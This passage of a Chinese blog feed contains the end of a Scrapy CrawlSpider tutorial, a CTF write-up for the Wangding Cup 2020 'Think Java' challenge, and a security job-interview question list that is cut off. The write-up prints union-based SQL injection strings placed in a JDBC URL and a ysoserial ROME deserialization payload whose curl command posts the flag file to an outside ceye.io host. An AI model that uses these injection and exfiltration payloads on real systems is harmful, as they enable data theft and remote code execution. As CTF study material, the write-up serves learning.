class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>想要<code>pipelines</code>运行，需要在<code>settings</code>中<code>ITEM_PIPELINES</code>取消注释</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ITEM_PIPELINES <span class="token operator">=</span> <span class="token punctuation">&#123;</span>   <span class="token string">'qsbk.pipelines.QsbkPipeline'</span><span class="token punctuation">:</span> <span class="token number">300</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>300</code>指优先级数字，可以自己修改，因为该项目中只有一个爬虫，所以不需要修改</p><p><code>DOWNLOAD_DELAY</code>可以设置爬虫延时，防止爬取过快</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">DOWNLOAD_DELAY <span class="token operator">=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h2 id="CrawlSpider"><a href="#CrawlSpider" class="headerlink" title="CrawlSpider"></a>CrawlSpider</h2><p>继承自<code>spider</code>，增加了新的功能，可以定义爬取的url的规则，使scrapy碰到满足条件的url都进行爬取，而不需要手动<code>yield Request</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">scrapy startproject wxapp<span class="token builtin class-name">cd</span> wxappscrapy genspider -t crawl wxapp_spider <span class="token string">"wxapp-union.com"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>wxapp_spider.py</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> scrapy<span class="token keyword">from</span> scrapy<span class="token punctuation">.</span>linkextractors <span class="token keyword">import</span> LinkExtractor<span class="token keyword">from</span> scrapy<span class="token punctuation">.</span>spiders <span class="token keyword">import</span> CrawlSpider<span class="token punctuation">,</span> Rule<span class="token keyword">from</span> wxapp<span class="token punctuation">.</span>items <span class="token keyword">import</span> WxappItem<span class="token keyword">class</span> <span class="token class-name">WxappSpiderSpider</span><span class="token punctuation">(</span>CrawlSpider<span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> <span class="token string">'wxapp_spider'</span>    allowed_domains <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'wxapp-union.com'</span><span class="token punctuation">]</span>    start_urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'https://www.wxapp-union.com/portal.php?mod=list&amp;catid=2&amp;page=1'</span><span class="token punctuation">]</span>    rules <span class="token operator">=</span> <span class="token punctuation">(</span>        Rule<span class="token punctuation">(</span>LinkExtractor<span class="token punctuation">(</span>allow<span class="token operator">=</span><span class="token string">r'.+mod=list&amp;catid=2&amp;page=\d'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> follow<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        Rule<span class="token punctuation">(</span>LinkExtractor<span class="token punctuation">(</span>allow<span class="token operator">=</span><span class="token string">r'article-.+\.html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> callback<span class="token operator">=</span><span class="token string">"parse_detail"</span><span class="token punctuation">,</span> follow<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">parse_detail</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">:</span>        title <span class="token operator">=</span> response<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="ct"]/div[1]/div/div[1]/div/div[2]/div[1]/h1/text()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>        p_label <span class="token operator">=</span> response<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//p[@class="authors"]'</span><span class="token punctuation">)</span>        author <span class="token operator">=</span> p_label<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'./a/text()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>        pub_time <span class="token operator">=</span> p_label<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'./span/text()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>        content <span class="token operator">=</span> response<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//td[@id="article_content"]//text()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getall<span class="token punctuation">(</span><span class="token punctuation">)</span>        content <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        item <span class="token operator">=</span> WxappItem<span class="token punctuation">(</span>title<span class="token operator">=</span>title<span class="token punctuation">,</span> author<span class="token operator">=</span>author<span class="token punctuation">,</span> pub_time<span class="token operator">=</span>pub_time<span class="token punctuation">,</span> content<span class="token operator">=</span>content<span class="token punctuation">)</span>        <span class="token keyword">yield</span> item<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>LinkExtractor链接提取器中注意<code>allow</code>（想要爬取的url规则），<code>follow</code>（在当前页面中碰到同样规则的url是否需要继续跟进爬取），<code>callback</code>（对于爬取到的页面要执行的回调函数）</p></blockquote><h2 id="scrapy-shell"><a href="#scrapy-shell" class="headerlink" title="scrapy shell"></a>scrapy shell</h2><p>进入项目文件夹</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">E:\Desktop\python<span class="token operator">-</span>project\spider<span class="token operator">-</span>project>cd wxappE:\Desktop\python<span class="token operator">-</span>project\spider<span class="token operator">-</span>project\wxapp><span class="token function">dir</span> 驱动器 E 中的卷是 资料 卷的序列号是 969F<span class="token operator">-</span>746D E:\Desktop\python<span class="token operator">-</span>project\spider<span class="token operator">-</span>project\wxapp 的目录2021<span class="token operator">/</span>10<span class="token operator">/</span>10  12:03    &lt;<span class="token function">DIR</span>>          <span class="token punctuation">.</span>2021<span class="token operator">/</span>10<span class="token operator">/</span>10  12:03    &lt;<span class="token function">DIR</span>>          <span class="token punctuation">.</span><span class="token punctuation">.</span>2021<span class="token operator">/</span>10<span class="token operator">/</span>10  11:44    &lt;<span class="token function">DIR</span>>          <span class="token punctuation">.</span>idea2021<span class="token operator">/</span>10<span class="token operator">/</span>10  11:07               253 scrapy<span class="token punctuation">.</span>cfg2021<span class="token operator">/</span>10<span class="token operator">/</span>10  11:26                82 <span class="token function">start</span><span class="token punctuation">.</span>py2021<span class="token operator">/</span>10<span class="token operator">/</span>10  12:03    &lt;<span class="token function">DIR</span>>          wxapp2021<span class="token operator">/</span>10<span class="token operator">/</span>10  12:03            82<span class="token punctuation">,</span>049 wxjc<span class="token punctuation">.</span>json               3 个文件         82<span class="token punctuation">,</span>384 字节               4 个目录 181<span class="token punctuation">,</span>172<span class="token punctuation">,</span>838<span class="token punctuation">,</span>400 可用字节E:\Desktop\python<span class="token operator">-</span>project\spider<span class="token operator">-</span>project\wxapp>scrapy shell https:<span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>wxapp<span class="token operator">-</span>union<span class="token punctuation">.</span>com<span class="token operator">/</span>article<span class="token operator">-</span>7167<span class="token operator">-</span>1<span class="token punctuation">.</span>html>>> response<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//h1[@class="ph"]//text()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'微信小程序开发时absolute定位偏移和宽高问题 '</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning_Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> spider </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯_2020_朱雀组_Think_Java</title>
      <link href="/2021/08/23/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java/"/>
      <url>/2021/08/23/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java/</url>
      
        <content type="html"><![CDATA[<p>题目链接：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p><h2 id="1-打开下载的class文件"><a href="#1-打开下载的class文件" class="headerlink" title="1. 打开下载的class文件"></a>1. 打开下载的class文件</h2><p>使用IDEA打开可得到java源码</p><h2 id="2-swagger-ui-html"><a href="#2-swagger-ui-html" class="headerlink" title="2. swagger-ui.html"></a>2. swagger-ui.html</h2><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/CTF-files/think_java.png"></p><p>注意到<code>import io.swagger.annotations.ApiOperation;</code> 可以访问/swagger-ui.html</p><p>看到下方路由地址<code>/common/test/sqlDict</code> 执行了<code>getTableData</code>函数，跟踪发现<code>dbName</code>参数存在sql注入</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/CTF-files/think_java_f2.png"></p><p>再看其调用的<code>getConnection</code>函数，使用<code>jdbc</code>链接数据库</p><blockquote><p>jdbc连接数据库语句后面可以跟参数，所以</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">jdbc:mysql://localhost:3306/myapp<span class="token comment">#' union select 1#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN@master/CTF-files/think_java_f3.png"></p><h2 id="3-SQL注入"><a href="#3-SQL注入" class="headerlink" title="3. SQL注入"></a>3. SQL注入</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># 得到表名</span>jdbc:mysql://localhost:3306/myapp<span class="token comment">#' UNION SELECT group_concat(table_name) from information_schema.tables where table_schema=database()#</span><span class="token comment"># 得到列名</span>jdbc:mysql://localhost:3306/myapp<span class="token comment">#' UNION SELECT group_concat(column_name) from information_schema.columns where table_name='user'#</span><span class="token comment"># 得到数据</span>jdbc:mysql://localhost:3306/myapp<span class="token comment">#' UNION SELECT pwd from user#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时得到密码 <code>admin@Rrrr_ctf_asde</code></p><h2 id="4-反序列化"><a href="#4-反序列化" class="headerlink" title="4. 反序列化"></a>4. 反序列化</h2><p>登陆请求包发送之后，得到的响应体如下</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"data"</span><span class="token operator">:</span> <span class="token string">"Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu"</span><span class="token punctuation">,</span>  <span class="token property">"msg"</span><span class="token operator">:</span> <span class="token string">"登录成功"</span><span class="token punctuation">,</span>  <span class="token property">"status"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token property">"timestamps"</span><span class="token operator">:</span> <span class="token number">1629722881931</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>一段数据以<code>rO0AB</code>开头，你基本可以确定这串就是Java序列化base64加密的数据。<br>或者如果以<code>aced</code>开头，那么他就是这一段Java序列化的16进制。</p></blockquote><p>于是思路为在路由地址<code>/common/user/current</code> 发送base64加密后的序列化的payload</p><h5 id="利用ysoserial生成序列化的payload"><a href="#利用ysoserial生成序列化的payload" class="headerlink" title="利用ysoserial生成序列化的payload"></a>利用<code>ysoserial</code>生成序列化的payload</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">E:<span class="token punctuation">\</span>Desktop<span class="token operator">></span>F:<span class="token punctuation">\</span>Java<span class="token punctuation">\</span>jre1.8<span class="token punctuation">\</span>bin<span class="token punctuation">\</span>java.exe -jar ysoserial-master-8eb5cbfbf6-1.jar ROME <span class="token string">"curl -d @/flag http://x.ceye.io/"</span> <span class="token operator">></span> a.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>payload为使用curl命令将flag文件内容发送至ceye平台</p></blockquote><h5 id="将其base64加密"><a href="#将其base64加密" class="headerlink" title="将其base64加密"></a>将其base64加密</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64s <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"a.txt"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    s <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将数据在<code>/common/user/current</code>发送即可得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN@master/CTF-files/think_java_f4.png"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全从业者面试指南</title>
      <link href="/2021/08/22/%E5%AE%89%E5%85%A8%E4%BB%8E%E4%B8%9A%E8%80%85/"/>
      <url>/2021/08/22/%E5%AE%89%E5%85%A8%E4%BB%8E%E4%B8%9A%E8%80%85/</url>
      
        <content type="html"><![CDATA[<p>关于安全行业面试的一些题目收集，关于简历</p><h2 id="好的简历"><a href="#好的简历" class="headerlink" title="好的简历"></a>好的简历</h2><ul><li>基本信息<strong>清晰</strong>：姓名、ID、性别、年龄、教育背景（毕业院校、专业、时间）、联系方式、期望地点</li><li>较完整的工作经历&amp;重大项目经验：注意空档期、工作业绩、重大项目担任的角色、分工与主要成果、公司行业知名度、个人管理经验</li><li><strong>体现</strong>技术能力：主要的技术栈以及能佐证的事情</li><li>其它<strong>优势</strong>：职业证书、奖项、会议分享、开源项目等</li><li>工作期望和方向：希望得到一个什么样的工作或自己专注的方向</li><li>个人评价：全方位的总结，展示出自己的专业技能掌握程度、亮点、优势等等</li><li>加分项<ul><li>使用PDF格式，简洁不花哨</li><li>有GitHub并参与过开源项目，可以写一些自己做过的小项目放上去</li><li>有个人博客，会写一些经验和问题的解决思路</li><li>邮箱使用gmail、foxmail或技术类邮箱（<a href="http://php.net/">php.net</a>）、私人域名邮箱等</li></ul></li><li>询问面试官对于自己的评价和可以改进的地方</li></ul><h2 id="面试题目"><a href="#面试题目" class="headerlink" title="面试题目"></a>面试题目</h2><h4 id="基础素质问题"><a href="#基础素质问题" class="headerlink" title="基础素质问题"></a>基础素质问题</h4><ul><li>对前面几轮面试官的看法如何？（HR问题，考察对他人评价）</li><li>前几次面试中，你有了解到这个岗位的工作职责和目标要求是什么吗？（HR问题）</li><li>对于异地工作你是怎么考虑的？（HR问题）</li><li>离职原因？为什么这个阶段要裸辞？（HR问题）<br>   提示：不要有太多消极负面东西，点到为止。提及原公司看法时，应当客观正面，切勿有个人情绪，尤其避免对上司、同事的抱怨。</li><li>薪资相关问题（HR问题）<br>   提示：如果面试官未谈及薪资问题，切勿主动提及。回答薪资相关问题时，在保证自己基本利益的前提下，表达自己的诉求，但一定不要把话说死，给后续谈判保留空间。相信企业会给自己一个合理的回报。</li><li>遇到解决不了的问题怎么做？工作中遇到最大的挑战是什么，如何解决的？(考察学习能力和动手解决能力)</li><li>业余时间会干嘛？(考察技术热情)<br>   提示：真实表达。可从乌云、翻墙、写技术博客、参与开源、常浏览的网站、关于黑客电视剧、关注业内牛人等角度。</li><li>自认为自己比身边人的优势和不足是什么？（客观的自我评价，讲自己没有缺点的基本可以不要了。挖掘亮点，如何客观看待自己）</li><li>别人对你最负面的评价是什么？你自己如何看待？</li><li>最有成就感的事情？（考察价值观）</li><li>未来职业规划？也可以问长期和中短期规划各是什么？（长远思考）</li><li>还有什么要问我的吗？（了解面试者所关心的侧重点）<br>   提示：可以选择有关企业发展、所应聘岗位定位相关问题，让面试官能感觉到你在关心公司发展和岗位兴趣。避免问题过多过细，也避免没有问题。</li></ul><h4 id="渗透测试（Web方向）"><a href="#渗透测试（Web方向）" class="headerlink" title="渗透测试（Web方向）"></a>渗透测试（Web方向）</h4><p>1、为何一个MYSQL数据库的站，只有一个80端口开放？</p><blockquote><p>更改了端口，没有扫描出来；</p><p>站库分离；</p><p>3306端口不对外开放</p></blockquote><p>2、一个成熟并且相对安全的CMS，渗透时扫目录的意义？</p><blockquote><p>敏感文件、二级目录扫描；</p><p>站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点</p></blockquote><p>3、在某后台新闻编辑界面看到编辑器，应该先做什么？</p><blockquote><p>查看编辑器的名称版本，然后搜索公开的漏洞。 </p></blockquote><p>4、审查上传点的元素有什么意义？</p><blockquote><p>有些站点的上传文件类型限制是在前端实现的，这时只要增加上传类型就能突破限制了</p></blockquote><p>5、CSRF、XSS及XXE有什么区别，以及修复方式？</p><blockquote><p>XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。</p><p>CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer。</p><p>XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</p></blockquote><p>6、3389无法连接的几种情况</p><blockquote><p>没开放3389端口</p><p>端口被修改</p><p>防护拦截</p><p>处于内网(需进行端口转发)</p></blockquote><p>7、列举出owasp top10 2017</p><blockquote><p>1）注入；</p><p>2）失效的身份认证；</p><p>3）敏感信息泄露；</p><p>4）XML外部实体（XXE）；</p><p>5）失效的访问控制；</p><p>6）安全配置错误；</p><p>7）跨站脚本（XSS）；</p><p>8）不安全的反序列化；</p><p>9）使用含有已知漏洞的组件；</p><p>10）不足的日志记录和监控。</p></blockquote><p>8、说出至少三种业务逻辑漏洞，以及修复方式？</p><blockquote><p>密码找回漏洞中存在密码允许暴力破解、存在通用型找回凭证、可以跳过验证步骤、找回凭证可以拦包获取等方式来通过厂商提供的密码找回功能来得到密码；</p><p>身份认证漏洞中最常见的是会话固定攻击和Cookie仿冒，只要得到Session或Cookie即可伪造用户身份；</p><p>验证码漏洞中存在验证码允许暴力破解、验证码可以通过Javascript或者改包的方法来进行绕过。 </p></blockquote><p>9、目标站无防护，上传图片可以正常访问，上传脚本格式访问则403，什么原因？</p><blockquote><p>原因很多，有可能Web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过</p></blockquote><p>10、目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？</p><blockquote><p>先爆破用户名，再利用被爆破出来的用户名爆破密码；</p><p>其实有些站点，在登陆处也会这样提示；</p><p>所有和数据库有交互的地方都有可能有注入</p></blockquote><blockquote><p>转载自作者：薯角 <a href="https://www.bilibili.com/read/cv9886414">https://www.bilibili.com/read/cv9886414</a> 出处：bilibili， 仅供自己学习使用</p></blockquote><h4 id="应用安全岗位-Web方向"><a href="#应用安全岗位-Web方向" class="headerlink" title="应用安全岗位-Web方向"></a>应用安全岗位-Web方向</h4><ul><li><p>漏洞利用修复基础。挑选两到四个不同方向常见和不常见的漏洞，就漏洞原理、利用方式和修复方案进行提问，然后根据回答的情况进行详细深入的二次提问</p><ul><li><p>Redis未授权访问漏洞如何入侵利用？</p></li><li><p>SSRF漏洞原理、利用方式及修复方案？Java和PHP的SSRF区别？</p></li><li><p>宽字节注入漏洞原理、利用方式及修复方案？</p></li><li><p>简述JSONP的业务意义，JSONP劫持利用方式及修复方案？如何设计落地一个CSRF Token？</p></li><li><p>CORS原理、利用及修复？</p></li><li><p>CRLF注入原理？</p></li><li><p>URL白名单如何绕过？</p></li><li><p>XSS持久化如何实现？</p></li><li><p>Fastjson常见漏洞原理？如何彻底解决Fastjson漏洞？</p></li><li><p>TLS1.2协议交互过程以及攻击方法？</p></li></ul></li><li><p>渗透全流程</p><ul><li><p>信息收集部分</p><ul><li>域名爆破中，泛域名解析问题如何解决？</li></ul></li></ul></li><li><p>漏洞检测方式</p><ul><li><p>可以从哪些阶段、层次去检测漏洞？其优劣势是什么？</p></li><li><p>越权问题如何检测？</p></li><li><p>白盒不适合检测哪些类型漏洞？</p></li><li><p>黑盒如何检测XSS漏洞？</p></li><li><p>如何爬取更全的请求？</p></li><li><p>黑盒带登录态扫描如何规避业务影响？</p></li><li><p>如何识别代码中后门？</p></li></ul></li><li><p>安全评估</p><ul><li><p>安全评估到底要评什么东西？</p></li><li><p>某些场景（登录、注册、修改密码、支付）会存在哪些风险以及如何防范？</p></li><li><p>新应用如何评估安全风险？</p></li><li><p>需求阶段、系分阶段安全评估的侧重点是什么？</p></li><li><p>接口B的参数是从接口A的响应中获取的，会存在什么风险？</p></li><li><p>Docker容器以及K8s有哪些风险？</p></li><li><p>IPv6和IPv4安全差异？</p></li><li><p>三方引入的应用和自研应用评估差异有哪些？</p></li><li><p>金融业务有何特色？</p></li><li><p>mvn源的安全性需要考虑哪些点？</p></li><li><p>如何让业务方主动找你评估？</p></li><li><p>如何判断评估覆盖范围的优先级？</p></li><li><p>如何降低各人检验导致评估不一致？</p></li><li><p>如何系统提高安全评估效率？</p></li><li><p>安全评估和人工测试以及自动化测试三者差异是什么？</p></li><li><p>算法模型的安全风险如何评估？</p></li><li><p>区块链安全风险主要有哪些？</p></li><li><p>如何理解安全左移？</p></li><li><p>安全评估的行业最佳实践是什么？</p></li><li><p>如何看待未来安全评估的趋势？</p></li></ul></li><li><p>安全方案</p><ul><li><p>如何规避绕口令带来的风险？</p></li><li><p>硬编码密钥如何系统解决？</p></li><li><p>0day漏洞如何防御</p></li><li><p>GitHub等三方泄漏敏感信息如何体系防御</p></li><li><p>业务逻辑漏洞如何通过技术手段避免写出来？</p></li><li><p>软件供应链后门和漏洞如何系统规避</p></li></ul></li><li><p>移动安全</p><ul><li><p>App自检升级场景下会存在哪些风险？</p></li><li><p>如何设计一套通信机制，能够保证传输过程中的完整性、不可抵赖性以及防止重放？</p></li><li><p>如何进行实体检测？</p></li><li><p>常见的调试方法和检测方法？</p></li><li><p>如何防止Frida、Xposed等注入攻击？</p></li><li><p>如何防止当前设备的数据拷贝到其他设备？</p></li><li><p>外挂有几种类型的实现方式？</p></li><li><p>如何避免未经用户授权获取权限？</p></li></ul></li><li><p>风险处置</p><ul><li><p>漏洞修复一般分为哪几个步骤？</p></li><li><p>如何制定漏洞的修复时间？需要考虑哪些因素？</p></li><li><p>如何系统性让提升漏洞修复效率？</p></li><li><p>漏洞修复完成后需要做什么事情？</p></li><li><p>外部厂商漏洞如何快速有效推进修复？</p></li></ul></li><li><p>应急响应</p><ul><li><p>有哪几种后门实现方式？</p></li><li><p>webshell检测有什么方法思路？</p></li><li><p>Linux服务器中了木马后，请简述应急思路？</p></li><li><p>遇到新0day(比如Struts2)后，应该如何进行应急响应？</p></li><li><p>新业务上线前可以从哪些方向进行安全评估？</p></li><li><p>现有系统可以从哪些方向进行审计发现其中的安全风险？</p></li><li><p>公司突然爆发大规模数据泄露导致的诈骗事件，如何应急？</p></li></ul><h4 id="网络主机岗位"><a href="#网络主机岗位" class="headerlink" title="网络主机岗位"></a>网络主机岗位</h4></li><li><p>主机最重要的基线是什么？</p></li><li><p>禁止出网的价值有哪些？</p></li><li><p>如何对网络区域进行划分？</p></li><li><p>云原生下的网络和主机差异是什么？会有哪些新的风险？</p></li><li><p>如何解决员工被钓鱼问题？</p></li><li><p>如何解决员工通过电脑或手机外发公司敏感文件？</p></li><li><p>经典网络与VPC的优劣势</p></li><li><p>如何实现反向HTTPS代理</p></li><li><p>DDoS/CC如何有效防御与应急？</p></li><li><p>如何通过技术手段避免非预期端口开放？</p></li><li><p>容器存在哪些特有安全风险？</p></li><li><p>运维白屏化的难点是什么？</p></li></ul><h4 id="威胁感知岗位-数据分析"><a href="#威胁感知岗位-数据分析" class="headerlink" title="威胁感知岗位-数据分析"></a>威胁感知岗位-数据分析</h4><ul><li>如何在加密流量中检测出恶意流量？</li><li>常见的C&amp;C通道种类和检测方法？</li><li>主机有哪些日志对安全有哪些帮助？</li><li>如何实现URL的去重？</li><li>如何识别公共和私有接口？</li><li>如何识别机器行为请求？</li><li>如何识别异常服务器外联？</li><li>如何感知越权风险？</li><li>如何识别攻击请求是定点攻击还是随机扫描？</li><li>如何识别钓鱼网站？</li><li>基于网络五元组可以做到哪些风险行为的分析？</li><li>未感知部分如何衡量？</li><li>威胁感知可以在哪些层面进行？</li><li>感知规则的有效性如何系统验证？</li><li>国内和国外攻击特点有什么区别？</li><li>专家检验无法覆盖的风险如何检测？</li></ul><h4 id="数据安全岗位"><a href="#数据安全岗位" class="headerlink" title="数据安全岗位"></a>数据安全岗位</h4><ul><li><p>安全责任与意识</p><ul><li>如何系统性提升员工安全意识？</li><li>如何做到针对性的安全意识提升？</li><li>如何衡量员工安全意识？</li><li>什么是安全责任制？如何落地安全责任制？</li></ul></li><li><p>数据采集使用</p><ul><li>数字水印的类型和应用领域？</li><li>隐藏水印有哪些实现方式？</li><li>如何对无显著特征的数据进行分类分级？</li><li>如何避免员工因非工作需要查询用户数据？</li><li>如何避免未经用户授权收集用户数据？</li><li>如何避免用户数据被超范围使用？</li><li>何时应该进行用户数据销毁？</li><li>更换机房时如何清除原机房机器数据？</li><li>如何让每一次后台查询数据都得到用户授权？or 如何收敛管理后台可查询任意敏感信息功能？</li><li>如何在不拿到明文数据的前提下，还能通过数据进行一些计算行为？如何实现合作伙伴原始数据不共享但能达成业务诉求？</li></ul></li><li><p>权限</p><ul><li>如何避免审批工单无脑通过？</li><li>高危害影响权限如何避免滥用？</li><li>如何技术手段规避未进行权限检查？</li><li>大数据平台的权限管控体系中最重要的是什么？</li></ul></li><li><p>加解密</p><ul><li><p>哪些Hash和加密算法不建议使用？</p></li><li><p>硬编码秘钥如何解决？</p></li><li><p>PKI原理</p></li><li><p>国密的底层原理？</p></li><li><p>密码如何保存在数据库？</p></li><li><p>如何让密码轮转？</p></li><li><p>内网传输是否需要加密？</p></li><li><p>可以在哪些层次对文件进行加密？</p></li><li><p>如何技术手段实现全站HTTPS</p></li></ul><h4 id="合规审计岗位"><a href="#合规审计岗位" class="headerlink" title="合规审计岗位"></a>合规审计岗位</h4><ul><li>国内外有哪些网络安全相关法律？</li><li>金融行业和传统互联网行业合规差异</li><li>对于内控、合规、审计的理解（考察其对于要做的事情和岗位要求、公司环境是否匹配，考察其大局上考虑是否周全或是片面）</li></ul><ul><li>传统行业和互联网行业的安全建设的区别及各自的优劣势（是否能准确的抓住核心原因）</li><li>信息安全等级保护、网络安全法、GDPR，挑选一到两个问其对其的来源理解以及落地程度取舍</li><li>数据安全治理可以用什么思路做？</li><li>如何通过技术手段实现对异常操作的自动化监控？</li><li>如何对一个应用进行安全评估？</li><li>如何对一个应用进行安全审计？</li><li>如何理解权限分离、最小化权限？</li><li>考察一些CISP、CISSP的知识点</li><li>挑选一些较为复杂的流程，比如转岗、离职等，如何设计考虑其中的细节</li></ul><h4 id="安全蓝军岗位"><a href="#安全蓝军岗位" class="headerlink" title="安全蓝军岗位"></a>安全蓝军岗位</h4><ul><li>安全蓝军和常规渗透测试的差异是什么？</li><li>蓝军如何体系建设？</li><li>各种常见木马的的优劣势？</li><li>木马免杀有哪些方式？哪种方式最有效？</li><li>木马隧道有哪些？哪种隧道在当前最有效？</li><li>Word DDE和Office宏有什么优劣势？</li><li>如何绕过Office受保护视图？</li><li>有哪些有效的钓鱼方式？</li><li>如何绕过WAF、HIDS、威胁感知，选其一回答？</li><li>BadUSB原理及局限？</li><li>Cobalt Strike</li><li>如何在禁止出网的机器上访问互联网？</li><li>ew、frp差异？</li><li>ICMP如何出网？</li><li>如何进行水坑攻击？</li><li>如何利用XSS让影响最大化？</li><li>如何全流程最大限度降低被红军发现概率？</li><li>如何在有限的人力下最大化突出蓝军价值？</li></ul><h4 id="安全管理岗位-安全架构方向"><a href="#安全管理岗位-安全架构方向" 